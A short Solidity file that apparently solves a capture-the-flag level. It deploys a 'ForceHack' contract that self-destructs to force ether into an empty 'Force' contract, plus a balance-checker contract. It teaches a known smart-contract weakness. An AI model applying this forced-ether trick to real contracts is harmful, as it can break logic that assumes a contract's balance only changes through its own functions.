// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// goal: make Force contract receive any money

// an original contract
// deploy it first
contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

// a contract that hacks the original one
// deploy it second
contract ForceHack {
    // firstly, send some money to ForceHack
    receive() external payable {}

    // secondly, use this function with Force address as an argument
    function hack(address payable _force) public {
        selfdestruct(_force);
    }
}

// a contract that checks the balance of the original one
// (we need a separate contract for this because ForceHack will be destructed after hack)
// deploy it third
contract balanceChecker {
    // use this function with Force address as an argument to check Force balance
    function checkBalance(address _force) public view returns (uint) {
        return _force.balance;
    }
}
